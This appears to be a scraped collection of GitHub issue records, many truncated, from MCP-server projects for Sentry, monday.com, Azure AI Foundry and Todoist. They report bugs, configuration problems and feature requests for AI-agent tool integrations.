   - Manage projects and teams
   - Analyze performance issues
   - Triage and assign issues

2. **Example Commands** for each workflow:
   - Debug: 'Show me errors in production from the last hour'
   - Analyze: 'Analyze issue PROJECT-123 with AI'
   - Monitor: 'How many errors today?'
   - Performance: 'Find slow database queries'

3. **Tool Combinations** that work well together

4. **Tips and Best Practices**

## Benefits
- Users can query 'What can I do with Sentry?' directly in their LLM
- Provides concrete examples instead of abstract tool descriptions
- Self-documenting and always accessible
- Reduces onboarding friction

## Acceptance Criteria
- [ ] Resource available at sentry://capabilities
- [ ] Returns comprehensive markdown guide
- [ ] Includes real-world examples for each major use case
- [ ] Tested with unit tests

When search-events generates EAP Explorer URLs for queries with relative time periods (e.g., ""last week"", ""today""), the URLs are missing the proper time parameters. The agent correctly generates the query and returns the right data, but the permalink doesn't include the date range.

## Expected Behavior

  - `statsPeriod` parameter (e.g., `statsPeriod=7d` for ""last week"")
  - OR absolute `start` and `end` parameters

## Actual Behavior
The generated URLs are missing time parameters entirely or have incorrect values.

### Example
Query: ""how many total tokens this week did we use""

Generated (incorrect) URLs:
- Both URLs had `statsPeriod=24h` instead of the correct time period
- Week URL should have `statsPeriod=7d` or absolute dates

### Example broken output:
```
Today, a total of 528,072 tokens were used. You can view more details in Sentry by following this link: View in Sentry.

The link text appears but is not clickable.

## Root Cause

The formatters in `packages/mcp-server/src/tools/search-events/formatters.ts` output the URL as plain text instead of creating a markdown link:

```typescript

This outputs the URL as plain text after the colon.

## Proposed Solution

Update the formatters to create proper markdown links:

```typescript
// Option 1: URL as the link text
output += `**📊 View these results in Sentry**: [${explorerUrl}](${explorerUrl})\n`;

// Option 2: Cleaner with ""View in Sentry"" as link text

getsentry/sentry-mcp,3290711224,457,search_events agent should validate and self-correct sort field inclusion errors,closed,2025-08-04T20:33:54Z,2025-08-05T20:57:45Z,[],dcramer,"## Problem

The `search_events` tool's embedded agent is not handling validation errors internally, causing them to bubble up to the user instead of self-correcting.

### Current Behavior
1. The agent generates a query with fields and sort parameters
2. The handler validates that the sort field is included in the fields array
3. If validation fails, it throws a UserInputError that bubbles up to the user
4. The user sees: ""Sort field 'equation|...' must be included in the fields array""

### Expected Behavior
According to the agent-in-tool pattern, the embedded agent should:
1. Validate its own output before returning
2. Self-correct if the sort field is missing from the fields array
3. Only bubble up errors that truly cannot be resolved

### Example Error
```
Sort field ""equation|sum(gen_ai.usage.input_tokens) + sum(gen_ai.usage.output_tokens)"" 
(from sort parameter ""-equation|sum(gen_ai.usage.input_tokens) + sum(gen_ai.usage.output_tokens)"") 
must be included in the fields array. 
Current fields: [sum(gen_ai.usage.input_tokens), sum(gen_ai.usage.output_tokens)]. 
```

### Proposed Solution
Move the sort field validation from the handler into the agent's output schema using Zod's `.refine()` method. This would allow the agent to see validation errors and retry with corrections.

### Impact
- Users experiencing confusing errors when using natural language queries
- Defeats the purpose of having an intelligent agent translate queries
- Makes the tool less reliable for complex aggregation queries"

This leads to empty or incorrect results.

## Root Cause

There's a mismatch between the time window used for attribute discovery and the actual query execution:

1. **Attribute Discovery**: Always uses a fixed 14-day window (`statsPeriod: ""14d""`)
2. **Query Execution**: Uses the user's requested time range (e.g., ""last 24 hours"")

This causes:
- Attributes discovered might not exist in the query's time range
- Aggregations fail when grouping by fields that don't exist in the results
- Users get unexpected empty results for valid queries

## Example Query

```
""give me a table of tool call names with their count from the last 24 hours""
```

Expected: Table with tool names and counts
Actual: Empty or incomplete results because attributes aren't properly constrained

## Code Locations

- Attribute fetching: `packages/mcp-server/src/tools/search-events/utils.ts:84-89`
- Query execution: `packages/mcp-server/src/tools/search-events/handler.ts:132-143`

## Suggested Fix

1. Pass time parameters to `fetchCustomAttributes` function
2. Use the same time range for both attribute discovery and query execution
3. Update the `datasetAttributes` tool to accept time range parameters
4. Validate field existence before executing aggregation queries

## Impact

This affects all aggregation queries where the grouped fields may not exist in all events within the requested time range, particularly for custom attributes and spans data."
getsentry/sentry-mcp,3251098318,421,Add support for looking up traces by trace ID,closed,2025-07-22T05:14:24Z,2025-07-31T21:39:24Z,[],dcramer,"## Feature Request

Add the ability to look up a trace by its trace ID to get a high-level overview and link to view trace details in Sentry.

## Use Case

Users often have a trace ID from logs or error reports and need to quickly:
1. Get a high-level overview of the trace (duration, services involved, error status)
2. Get a direct link to view the full trace details in Sentry

## Proposed Solution

Create a new MCP tool (e.g., `get_trace_details`) that:
- Accepts a trace ID as input
- Queries the Sentry API to fetch trace information
- Returns:
  - Trace overview (start time, duration, number of spans)
  - Services/projects involved
  - Error status
  - Direct link to view the trace in Sentry UI

## Example Usage

```
User: ""Show me trace abc123def456""
Assistant: [calls get_trace_details with trace_id=""abc123def456""]
Returns: 
- Started: 2025-01-22 10:30:15
- Duration: 2.3s
- Spans: 15
- Services: frontend, api, database
- Status: Error in api service
- View details: https://sentry.io/organizations/my-org/performance/trace/abc123def456/
```

## Implementation Notes

- The Sentry API endpoint for traces is: `/api/0/organizations/{org}/events-trace/{trace_id}/`
- Should handle cases where trace ID is not found
- Consider adding support for partial trace IDs"
getsentry/sentry-mcp,3250620234,415,Seer AI analysis suggestions may not always be accurate,open,2025-07-22T01:32:06Z,2025-07-22T01:32:06Z,[],dcramer,"## Summary

When analyzing errors in the search_events agent, Seer AI suggested adding `maxToolRoundtrips: 3` to the `generateText` call. However, this property doesn't exist in the AI SDK's generateText options, leading to TypeScript errors.

## Problem

1. Seer AI provides analysis and suggestions that may not always be accurate or applicable
2. Our tools should not blindly trust Seer's suggestions without validation
3. We need better error messaging to indicate when Seer's suggestions might be incorrect

## Context

From issue MCP-SERVER-ECD: https://sentry.sentry.io/issues/6761713004/
- Error: `AI_NoObjectGeneratedError: No object generated: could not parse the response.`
- Seer suggested: ""Add maxToolRoundtrips: 3 to generateText call""
- Reality: This property doesn't exist in the AI SDK

## Proposed Solution

1. Add disclaimers in the analyze_issue_with_seer tool output indicating that suggestions should be validated
2. Include context about the tool's limitations in the response
3. Consider adding validation for common incorrect suggestions

However, with Markdown output, it's quite difficult to render frontend components from the tool response (e.g., in Gen UI).

If each tool could accept an outputFormat parameter (with literal values like ""md"" or ""json""), it would solve this issue. This parameter should be optional and default to ""md"", but if set to ""json"", the tool must return the raw JSON API response instead of the parsed Markdown output.

Latest version of Claude Desktop and sentry-mcp

### Steps to Reproduce

1. Added URL/Token in claude config file (NOTE my URL has a custom port in it: SENTRY_URL=https://sentry.trainerday.com:9443/)
2. Verified the token works with the curl command (curl -H ""Authorization: Bearer sntryu_xxxx"" ""https://sentry.trainerday.com:9443/api/0/organizations/"")
3. Verified the sentry_private entry shows correctly under Claude Desktop Developer Settings
4. Asked for the Sentry Organization name


### Expected Result

Organization name returned

We provide lots of additional content as attatchments in our events. This includes dump files. We would like to be able to have the agent download the dump file using an MCP tool so it can be analyzed locally.

### Solution Brainstorm

I believe this can be accomplished using embeded resourcers in the response (see https://modelcontextprotocol.io/specification/2025-06-18/server/tools#embedded-resources)

If the code is open source let me know and I can make a PR.

- Remote Sentry MCP
- Cursor AI

### Steps to Reproduce

Issue command with model Claude 4 Sonnet Thinking:
Give me all Sentry issues in organization xyz, project abc with level:fatal AND pluginIdentifier:id123 which are no older than 7 days.

### Expected Result

You get the 10 issues.

### Actual Result

You get 0 results, although there are about 10 issues.
I performs this tool call:
```
{
  ""organizationSlug"": ""xyz"",
  ""projectSlug"": ""abc"",
  ""query"": ""level:fatal pluginIdentifier:id123 age:-7d"",
  ""regionUrl"": ""https://us.sentry.io"",
  ""sortBy"": ""last_seen""
}
```

### Notes

Probably `age:-7d` is the wrong semantics. If I specify `age:-7d` in Discover on the Sentry website, I also get 0 results. I need to apply the date range filtering outside of the query.

getsentry/sentry-mcp,3161767923,282,Sentry MCP tool 'find_issues' fails with 'fetch failed' communication error,closed,2025-06-20T02:54:11Z,2025-06-20T18:16:57Z,[],iberi22,"### Environment

- **Environment:** AI Agent (e.g., Windsurf, Cursor) using the MCP server plugin.
- **Tool:** `@sentry/mcp-server`
- **Sentry Organization used:** `Sentry` (as per the arguments in the tool call).

### Steps to Reproduce

1.  Set up and run the `@sentry/mcp-server` with proper authentication.
2.  From an AI agent, invoke the `sentry/find_issues` tool.
3.  Provide the following arguments in the call:
    ```json
    {
      ""organizationSlug"": ""Sentry"",
      ""query"": ""dashboard graph chart"",
      ""sortBy"": ""last_seen""
    }
    ```

### Expected Result

The `find_issues` tool should successfully connect to the Sentry API and return a list of issues matching the query, or an empty list if none are found.

### Actual Result

The tool call fails with a network communication error. The server returns the following error, indicating that the fetch request could not be completed:

**Error:** `It looks like there was a problem communicating with the Sentry API.`
**Reason:** `fetch failed`
**Sentry Event ID for this failure:** `0556574748ae4468812f872488c84e1e`

This Event ID is crucial for the Sentry team to be able to track the failed request in their internal systems.

### Sentry Issue w/ 'Solution' from Seer
[Link to Sentry Issue](https://demo.sentry.io/issues/6685098035/?project=5808623&referrer=issue-list&statsPeriod=90d)

### Steps to Reproduce

Repro steps documented [here](https://www.notion.so/sentry/Cursor-Sentry-MCP-internal-only-2108b10e4b5d80cda533ea8610104905?source=copy_link).
By the way, this works sometimes as expected and sometimes it doesn't (as seen in attached screenshots).
I ran this 5x yesterday and it worked as expected, but did not work as expected when I tried today.

### Expected Result

Seer analysis would have been leveraged, and fix would have been issued to .py rather than .jsx

![Image](https://github.com/user-attachments/assets/ff26c852-841d-4501-93bf-bfaab0adf17a)

### Actual Result

In this case, it ended up changing the .jsx, which isn't where the fix is relevant/applicable. Seer Solutions said to fix it in backend/.py

getsentry/sentry-mcp,3140923619,263,"update_issue function fails with ""missing required parameter: owner"" despite undocumented requirement",closed,2025-06-12T16:30:14Z,2025-06-22T03:21:07Z,[],jcardonne,"### Environment
- **Sentry MCP Server**: Connected via https://mcp.sentry.dev/
- **Client**: Claude AI with MCP integration
- **Region**: US Sentry instance (https://us.sentry.io)
- **Authentication**: OAuth authenticated via MCP server

### Steps to Reproduce
1. Connect to Sentry MCP server via https://mcp.sentry.dev/
2. Successfully authenticate and verify access to organization and projects
3. Attempt to update an issue status using the `update_issue` function with required parameters:
   ```
   update_issue(
     issueId=""PROJECT-123"",
     organizationSlug=""my-org"",
     status=""resolved""
   )
   ```
4. Also tried with `issueUrl` parameter:
   ```
   update_issue(
     issueUrl=""https://us.sentry.io/organizations/my-org/issues/PROJECT-123"",
     status=""resolved""
   )
   ```
5. Also tried with additional `regionUrl` parameter and `assignedTo` parameter

### Expected Result
The issue should be updated with the new status (resolved) successfully, as the function schema indicates these are the required parameters for the `update_issue` function.

### Actual Result
All attempts to use `update_issue` function fail with the error:
```
missing required parameter: owner
```

**Issue Details:**
- The MCP function schema for `update_issue` does not document an ""owner"" parameter as required
- The error consistently occurs regardless of which parameter combination is used
- Other read-only functions (like `find_issues`, `get_issue_details`) work correctly
- The error suggests a mismatch between the documented function schema and the actual implementation

**Function Schema (as presented to client):**
```
update_issue(
  issueId?: string,
  issueUrl?: string, 
  organizationSlug?: string,
  status?: ""resolved"" | ""resolvedInNextRelease"" | ""unresolved"" | ""ignored"",
  assignedTo?: string,
  regionUrl?: string
)
```

**Logs/Error Output:**
```
missing required parameter: owner
```

This appears to be either:
1. A missing parameter in the function schema documentation
2. A server-side validation issue where an undocumented parameter is required
3. An authentication/permission issue manifesting as a parameter error

The issue prevents any programmatic updates to Sentry issues via the MCP server, limiting functionality to read-only operations."

- Cursor version: `1.0.0`

### Steps to Reproduce

- Added Sentry to my MCP settings in Cursor using the following configuration:

```json
""Sentry"": {
  ""command"": ""npx"",
  ""args"": [
    ""mcp-remote@latest"",
    ""https://mcp.sentry.dev/sse""

}
```

- Also attempted to add a token using the env field. 

-  Used the following prompt:

`Find the top 5 performance issues in my backend for project X. Show only transactions that are longer than 0.5 seconds.`

### Expected Result
The `find_transactions `tool should be invoked and return the top performance issues (transactions > 0.5s).

### Actual Result

The tool  `find_transactions` failed due to a permissions error.

### Prompt and response:
**Can you find endpoints that have p50 of more than 0.5 seconds?**


![Image](https://github.com/user-attachments/assets/216203f1-668d-4371-a452-c9994c141125)



**Why does the `find_issues `tool work, but `find_transactions` does not?**


![Image](https://github.com/user-attachments/assets/3c614d22-f372-43db-bc3b-263c7a5cf411)



### Remarks
- I am **able to access** the ""Insights"" tab in the Sentry web app, so I don't believe this is a general permissions issue.

- The find_issues tool does work correctly via MCP.

### Questions
- Why is find_transactions failing while find_issues succeeds?

- Is there an additional permission or configuration needed for the find_transactions tool?

getsentry/sentry-mcp,3097829289,230,Sentry MCP Integration Fails with Self-Hosted Sentry – API Response Type Error,closed,2025-05-28T15:49:27Z,2025-06-13T16:55:39Z,[],mshddev,"### Summary
I am attempting to use the Sentry MCP integration with my self-hosted Sentry instance, but it fails to retrieve the list of organizations. The same API call works with curl and a valid token, but the MCP integration returns a type error.

### Environment

Sentry MCP Client: 0.10.0
Self-Hosted Sentry Version: 22.6
MCP Client: Cursor IDE
Authentication: Bearer token (valid, confirmed working via curl)

### Steps to Reproduce:
- Configure Sentry MCP in Cursor to point to my self-hosted Sentry instance.
- Attempt to list organizations using MCP (e.g., via find_organizations).
- Observe the error.


### Mcp config
`.cursor/mcp.json`
```
""sentry"": {
      ""command"": ""npx"",
      ""args"": [
        ""@sentry/mcp-server@0.10.0""
      ],
      ""env"": {
        ""SENTRY_ACCESS_TOKEN"": ""<token>"",
        ""SENTRY_HOST"": ""<self-hosted-sentry-host>""
      }
    }
```

### Expected Behavior:
MCP should return the list of organizations, just as the direct API call does.


### Actual Result
MCP returns an error with the following details:
```
**Event ID**: a32adc86208741c12345ae4e7ff3c0947

[
  {
    ""code"": ""invalid_type"",
    ""expected"": ""object"",
    ""received"": ""undefined"",
    ""path"": [
      0,
      ""links""
    ],
    ""message"": ""Required""
  }
]
```

### Additional Info
When running the following curl command, the API responds correctly with the organization data:
```
  curl -H ""Authorization: Bearer <token>"" https://<self-hosted-sentry-host>/api/0/organizations/
```

```json
  [
    {
      ""id"": ""x"",
      ""slug"": ""xxx"",
      ""status"": {""id"": ""active"", ""name"": ""active""},
      ""name"": ""xxx"",
      ""dateCreated"": ""2025-05-22T05:25:22.765000Z"",
      ...
    }
  ]
```

### Questions:
- Is there a compatibility issue between MCP and self-hosted Sentry?
- Are there any configuration options or workarounds to make MCP work with self-hosted Sentry?

### Steps to Reproduce

Log in via auth flow
Ask claude listOrganizations()


### Expected Result

My default organization

### Actual Result

I'll help you find the organizations you have access to in Sentry.Ffind_organizationsRequest{}Response# 

Organizations

You don't appear to be a member of any organizations.
It looks like you don't currently have access to any Sentry organizations. This could mean:

You haven't been added to any organizations yet
You may need to create a new organization
There might be an authentication issue with your Sentry account

If you need to join an existing organization, you'll need an invitation from an organization admin. If you're looking to create a new organization, you would typically do that through the Sentry web interface at sentry.io.
Is there anything specific you were looking to do with Sentry organizations?

I start off with `use 'get_issue_details' to show me sentry issue 661579911x on the yyy project for the abc org` (issue id, org and projects have been replaced with duds for this issue).

It starts off quite well, with the following response

I can see this is a Sentry issue (YYY-JY) from the abc organization. The issue appears to be a communication error with the XYZ API. Here's a summary of the issue:

I'll fetch the issue details again but focus on getting the stack trace information from the event.

I notice that the detailed stack trace isn't included in this view. Let me try to get more detailed event information by using the Event ID that was provided.

I apologize for the error. It seems we need to specify the project ID (yyy) when querying for the event details. Let me modify the request to include the project.

- `context` which contains arbitrary user-attached metadata.

I'm sure there are more fields outside of these we are omitting for now. This is also at odds with wanting to keep token usage lower where possible. Thoughts @dcramer? Should there perhaps be a flag for ""extra details"" or something so it's optional? But then that adds onto tool context... 🤔 "

### Steps to Reproduce
1. Add Github MCP to Github Copilot or Cursor, configured with my PAT
2. Add Sentry MCP to the same IDE workspace, configured with SSE (also tried with stdio with no difference)
3. Ask a model in agentic mode to use the list_issues tool with Sentry

### Expected Result
Sentry's list_issues runs as expected, listing issues for an org's project.

### Actual Result

The model attempts to run Sentry's tool, but instead runs Github MCP's `list_issues` (and gets an owner missing parameter error).

It looks like there was an error when trying to fetch your Sentry organizations. This could be due to a temporary issue or a missing configuration.

To proceed, please ensure:

You are authenticated with Sentry in your environment.
Any required API keys or credentials are set up.
If you have this information or want to try again, let me know! If you want to manually check, you can also visit https://sentry.io/organizations/ to see your organizations directly.
```

### Additional info

Other prompts fail too like:

> Prompt: what is the latest issue in Sentry for project [redacted-org-slug]/[redacted-project-slug]

```
I'll check the latest issue in Sentry for the [redacted] mobile app. Let me query Sentry for this information.

MCP Tool: Sentry / list_issues
Ran with these arguments:
{
  ""organizationSlug"": ""redacted-org-slug"",
  ""projectSlug"": ""redacted-project-slug"",
  ""sortBy"": ""last_seen""
}
Output
Error

There was a 400 error with the your request to the Sentry API.

You do not have access to query across multiple projects. Please select a project for your query.

If you believe this was a genuine error, please report the following to the user for the Sentry team:

Event ID: 109f3fdac020499cb857483d074e766e
```

## Note

* Getting details of an issue by its URL is working fine, which suggests to me that authorisation is fine.  The agent calls ""get_issue_details"" and is able to give the right summary.

* I tried deleting `~/.mcp-auth` as mentioned on another issue but still the same result.

### Steps to Reproduce
Add sentry-mcp server, send message to openai with model gpt-4o, got error below:
```

After checking the TOOL_DEFINITIONS, it appears that the description of both the list_issues and search_errors functions exceeds the 1024-character limit.

mondaycom/mcp,3530601521,111,Turning on read-only mode will make Claude unable to retrieve any board data,open,2025-10-20T00:18:51Z,2025-10-28T16:02:51Z,[],Dahuan-Ou,"Hello Monday MCP team !

Thanks for developing this fantastic MCP tool for Monday.com, works really well.   However have noted an issue with the read-only mode.

If we set the read-only mode to true in config.json file ), most tools will be removed from Claude, only 5 tools are left available.

What I have observed from testing is, with read-only mode, Claude is unable to fetch any actual data columns -- except 4 fields, 'item id', 'item name', 'group id', and 'group name', since it's not able to retrieve any useful data from the monday board, the read-only mode is not really usable.
So the current behavior of the read-only mode (removing the tools) doesn't seem to be the right solution, it should not have removed the tools but it should just prevent any changes/update to be actually executed.

The rationale and strong interest of a true 'read-only' mode is to prevent AI from changing/updating the data proactively without confirming with the user.   Sometimes AI assumes that user wants a change and proactively makes the change when the user was only asking for an advice.

- Missing documentation on how to setup Agentic SDKs like Strands Agents, LangGraph, etc
- The hosted mcp docs are irrelevant when using Agentic SDKs and are only addressing IDE integration
- The hosted mcp docs endpoints seems incorrect as sse is deprecated and streamable should be used. I'm using undocumented endopoint with Strands Agents which seems to work fine: https://mcp.monday.com/mcp
- It seems that with https://mcp.monday.com/mcp and hosted mcp I have access to more than the tools listed [here](https://github.com/mondaycom/mcp?tab=readme-ov-file#-available-tools)., I was able to list deal activity, check activity owner, etc
- Not sure whether I need [Dynamic API Tools](https://github.com/mondaycom/mcp?tab=readme-ov-file#-dynamic-api-tools-beta) when using the hosted MCP. Clarification can help to understand what hosted MCP expose (this is missing) and how dynamic tools extends it (this is documented)
- Add an option to check status of dynamic tools (only, enabled, disabled), and a way to disable it (I assume --enable-dynamic-api-tools false will do the job - am I correct)?

mondaycom/mcp,3204150427,41,[Bug] MCP Server silently closes connection with Python client after successful handshake,open,2025-07-05T03:15:05Z,2025-07-05T03:21:42Z,[],eribeirossantos,"### Summary

When running the `@mondaydotcomorg/monday-api-mcp` server locally from source, it successfully compiles and starts. A Python client using the Google ADK (`google-adk`) can establish an SSE connection, and the server logs confirm it receives the connection and a subsequent POST message from the client.

However, immediately after this successful handshake, the server closes the connection without any server-side error logs. This causes the Python client to fail with `mcp.shared.exceptions.McpError: Connection closed`.

This issue occurs even with a freshly regenerated Personal API Token and with simple, direct queries, suggesting a potential bug in the internal logic of the agent toolkit after it handles the first client request.

### Environment

- **Node.js:** v23.8.0
- **Yarn:** v1.22.22
- **OS:** Windows
- **Python:** 3.13
- **google-adk:** (The user's version of the Google Agent Development Kit)

### Steps to Reproduce

1.  **Clone the repository:**
    ```bash
    git clone [https://github.com/mondaycom/mcp.git](https://github.com/mondaycom/mcp.git)
    ```

2.  **Install dependencies from the root directory:**
    ```bash
    cd mcp
    yarn install
    ```

3.  **Build the entire project from the root directory:**
    ```bash
    yarn build
    ```

4.  **Replace the content of `packages/monday-api-mcp/src/index.ts`** with the following code to enable SSE transport and logging:
    ```typescript
    import * as http from 'http';
    import { SSEServerTransport } from '@modelcontextprotocol/sdk/server/sse.js';
    import { MondayAgentToolkit } from '@mondaydotcomorg/agent-toolkit/mcp';
    import { parseArgs, validateArgs } from './utils/args/args.service.js';
    import dotenv from 'dotenv';

    dotenv.config();

    const args = process.argv.slice(2);
    const parsedArgs = parseArgs(args);
    const validatedArgs = validateArgs(parsedArgs);

    const toolkit = new MondayAgentToolkit({
      mondayApiToken: validatedArgs.token,
      mondayApiVersion: validatedArgs.version,
      mondayApiRequestConfig: {},
      toolsConfiguration: {
        readOnlyMode: validatedArgs.readOnlyMode,
        enableDynamicApiTools: validatedArgs.enableDynamicApiTools,
        mode: validatedArgs.mode,
        enableToolManager: false,
      },
    });

    const server = http.createServer(async (req, res) => {
      if (req.url === '/sse') {
        console.log('[INFO] SSE connection received. Attaching transport...');
        const transport = new SSEServerTransport('/', res);
        await toolkit.connect(transport);
        return;
      }
      
      if (req.method === 'POST' && req.url && req.url.startsWith('/?sessionId=')) {
        console.log('[INFO] POST message received from client.');
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify({ status: 'ok' }));
        return;
      }
      
      res.writeHead(404);
      res.end('Not Found');
    });

    const port = 8080;
    server.listen(port, () => {
      console.log(`HTTP Server running at http://localhost:${port}`);
      console.log(`MCP SSE Endpoint at http://localhost:${port}/sse`);
      console.log('Press Ctrl+C to stop the server.');
    });

    server.on('error', (err) => {
      console.error('HTTP Server Error:', err);
    });
    ```
    *And then run `yarn build` from the root directory again to compile this change.*

5.  **Run the MCP Server** from within its package directory with dynamic tools enabled:
    ```bash
    cd packages/monday-api-mcp
    node dist/index.js -t ""YOUR_MONDAY_API_TOKEN"" --enable-dynamic-api-tools true
    ```

6.  **Create a Python client (`agent.py`)** with the following code:
    ```python
    from google.adk.agents import Agent
    from google.adk.sessions import InMemorySessionService
    from google.adk.runners import Runner
    from google.genai import types
    from google.adk.tools.mcp_tool import MCPToolset, SseConnectionParams

    load_dotenv()

    async def get_agent():
        toolset = MCPToolset(
            connection_params=SseConnectionParams(
                url=""http://localhost:8080/sse"",
            )
        )
        
        root_agent = Agent(
            name=""monday_agent"",
            description=""This is my monday agent."",
            instruction=""You are a helpful assistant."",
            model=""gemini-1.5-pro"", # Using a known model
            tools=[toolset]
        )
        return root_agent, toolset

    async def main(query):
        session_service = InMemorySessionService()
        await session_service.create_session(
            app_name=APP_NAME,
            user_id=USER_ID,
            session_id=SESSION_ID,
        )

        root_agent, toolset = await get_agent()

        runner = Runner(
            app_name=APP_NAME,
            agent=root_agent,
            session_service=session_service
        )

        content = types.Content(role=""user"", parts=[types.Part(text=query)])

        print(""Running agent with query:"", query)
        events = runner.run_async(
            new_message=content,
            user_id=USER_ID,
            session_id=SESSION_ID,
        )

        async for event in events:
            if event.is_final_response:
                final_response = event.content.parts[0].text
                print(""Agent Response: "", final_response)

        await toolset.close()

    if __name__ == ""__main__"":
        query = ""What boards are in my account?"" # A simple query
        asyncio.run(main(query))
    ```

7.  **Run the Python client** in a separate terminal:
    ```bash
    python agent.py
    ```

### Expected Behavior

The Python agent should connect and print a final response from the Monday API, such as a list of boards or a message indicating what it can do.

### Actual Behavior

**Server-Side Log:** The Node.js server prints the following and remains running without any errors."

```

You'll see the item ID ended up with `9999993` tacked onto it, making the ID an floating point number. E.g. `2024541273.9999993` instead of 2024541274.

Here is the model's assessment of the situation, indicating it gave the right ID to the MCP server, and then the MCP server changed it before passing on to the API:


> Based on the error details we've seen, specifically the ""Item not found"" error from the Monday.com API which occurred because the `itemId` parameter in the API request payload was a floating-point number (like `2025483737.9999993`) instead of an integer:
> 
> 1.  My model processed your request and identified the correct integer item IDs from the previous search results (e.g., `2025483738`).
> 2.  My model then generated the instruction to call the `change_item_column_values` tool with these specific integer IDs as arguments.
> 3.  This tool call request, with the integer IDs, was sent to the system responsible for executing the tools, which is the `monday-api-mcp-hosted` server in this case.
> 4.  The `monday-api-mcp-hosted` server is responsible for taking the tool call request from my model and constructing the actual GraphQL API call to Monday.com, including correctly formatting the parameters like `itemId`.
> 
> Therefore, the most likely place where the integer item ID was incorrectly converted into a floating-point number, causing the ""Item not found"" error from Monday.com, is **within the `monday-api-mcp-hosted` server's processing logic** before it sent the request to the Monday.com API.
> 
> My model generated the correct integer ID based on the data I received from the previous search tool call. BoltAI is your client interface and is involved in sending your initial requests to me and receiving my final responses (where you see the `malformedContent` error), but it's not involved in the specific step where the MCP server constructs the API call payload to Monday.com.
> 
> So, the issue with the malformed integer ID appears to be with the **`monday-api-mcp-hosted` server**."

For example, if an openai model supports free playground, ""type"" will be always ""Free Playground"", and ""code_sample_azure"" will be empty.

azure-ai-foundry/mcp-foundry,3340218209,64,fix: Replace git+https:// install source with archive (zip) or tagged releases to avoid Git dependency,open,2025-08-21T04:16:05Z,2025-08-21T04:20:57Z,[],dem108,"### Summary
On Windows (and some managed environments), uvx fails when resolving VCS sources because it shells out to a git executable that may not exist in the inherited PATH. Using a GitHub archive URL (or a tagged release) removes the runtime Git dependency and works reliably with uvx.

### Motivation
- Fixes “Git executable not found” when launching the MCP server from clients like Claude Desktop.
- Improves first-run success rate and onboarding (esp. Windows).
- More reproducible and cacheable installs; easier to pin to tags.
- Aligns with ecosystem guidance: VCS URLs for dev/contributors; archives/tags for users.

### Proposal
- Replace `--from git+https://github...@branch/commit` with `--from https://github.com/azure-ai-foundry/mcp-foundry/archive/refs/tags/vX.Y.Z.zip` (preferred) or `refs/heads/main.zip` (if no tags yet).
- Document a fallback strategy (prefer tag; otherwise archive; VCS only for contributors).

### Acceptance Criteria
- Launch instructions work on Windows without Git installed.
- CI smoke test covering uvx --from <archive> passes on Windows/Linux/macOS.
- Docs updated (README, examples, client snippets)."

When I sync my weekly notes with Todoist through the API the agent rely on `todoist.fetch` to pull a single task by ID. After completing a task in the app, the fetch response still looks like this:

{
  ""id"": ""task:xxxxxxxxxxxxxxxxxxxxxx"",
  ""title"": ""Example task title"",
  ""text"": ""Example task title\n\nDescription: Some extra context\nDue: 2025-10-20\nLabels: Example"",
  ""url"": ""https://app.todoist.com/app/task/xxxxxxxxxxxxxxxxxxxxxx"",
  ""metadata"": {
    ""priority"": 4,
    ""projectId"": ""projectId123"",
    ""sectionId"": ""sectionId123"",
    ""parentId"": null,
    ""recurring"": false,
    ""duration"": null,
    ""responsibleUid"": null,
    ""assignedByUid"": null
  }
}

There is no `completed`, `is_done`, `completed_at`, or any other flag that tells the agent the task has been archived. To confirm completion the agent has to make a second call to `completed.get_all` (or the Sync API with the `completed_tasks` resource) and check whether the same ID appears there.

### Expected behaviour
It would be helpful if the single-task fetch response exposed completion state—for example via a boolean `completed` field and/or a timestamp `completed_at`. That would let the agent determine status without issuing a second API call.

### Why this matters
My automation updates documentation based on Todoist. A single fetch that returns both the task data and its completion state would simplify the integration and reduce API usage. At the moment the agent has to “double check” every task by hitting two different endpoints.

Thanks for considering this request!"

Priority is returned as an enum for tasks.

1 = P4
2 = P3
3 = P2
4 = P1

however the llm assumes that when it sees 1 for priority it means P1...not P4.

I'm adding instructions in my system prompt to mitgate this but maybe you can build the clarification into the tool.

### Todoist Priority Nuances
- Todoist's API uses an enum for priorities: 4 = P1 (highest, red exclamation), 3 = P2 (orange), 2 = P3 (blue), 1 = P4 (lowest/default, no color indicator).
- In UI previews and responses, display as ""P1"", ""P2"", etc., and note that P4 means ""no priority"" visually.

Hopefully that will patch the issues for now.

Doist/todoist-ai,3418892277,92,Add reminders support to add-tasks and update-tasks tools,open,2025-09-15T17:40:02Z,2025-09-30T15:16:44Z,[],Sarozs2863,"## Current Limitations

The current `add-tasks` and `update-tasks` tools don't support two core Todoist features that are available in the official REST API:

**Missing functionality:**
- `add-tasks` tool parameters only include: `content`, `description`, `dueString`, `duration`, `priority`, `projectId`, `sectionId`, `parentId`
- ❌ No `reminders` parameter available
- ❌ ~~No `labels` parameter available~~ (labels support was added in #103)
- Users must manually add reminders ~~and labels~~ in the Todoist app after creating tasks via API

## Proposed Enhancement
Add `reminders` ~~and `labels`~~ parameters to `add-tasks` and `update-tasks` tools:

### 1. Reminders Support
**Reminder types:**
- Multiple reminders per task
- Relative reminders (e.g., ""1 day before due date"", ""2 hours before due date"")
- Absolute reminders (e.g., ""2025-09-26T10:00:00"")

### ~~2. Labels Support~~
~~**Label functionality:**~~
- ~~Add multiple labels to tasks during creation~~
- ~~Update task labels~~
- ~~Support both label names and label IDs~~
- ~~Maintain consistency with existing Todoist labeling system~~

**Example usage:**
```javascript
await addTasks({
  tasks: [{
    content: ""Important meeting"",
    dueString: ""tomorrow at 2pm"",
    labels: [""urgent"", ""meeting"", ""work""],
    reminders: [
      { type: ""relative"", value: ""1 day"" },
      { type: ""relative"", value: ""1 hour"" },
      { type: ""absolute"", value: ""2025-09-26T09:00:00"" }
    ]
  }]
});
```

## Use Cases
- **Travel planning**: Set multiple advance reminders + travel labels for flights, trains, etc.
- **Meeting preparation**: Remind users days/hours before important meetings + appropriate labels (urgent, meeting, etc.)
- **Project management**: Categorize tasks with labels while setting up deadline reminders
- **Workflow automation**: Programmatically create fully-configured tasks with complete reminder and labeling setup
- **GTD implementation**: Support Getting Things Done methodology with proper categorization and timing

## Technical Implementation
Both features are already supported in the Todoist REST API:

### Reminders API Support
- **API Reference**: https://developer.todoist.com/rest/v2/#create-a-new-task
- **Reminders field**: Already documented and available in official API
- **Data structure**: Well-defined reminder object format

### ~~Labels API Support~~
- ~~**API Reference**: https://developer.todoist.com/rest/v2/#create-a-new-task~~
- ~~**Labels field**: Already documented and available in official API~~
- ~~**Data structure**: Simple array of label names or IDs~~

## Impact
This enhancement would:
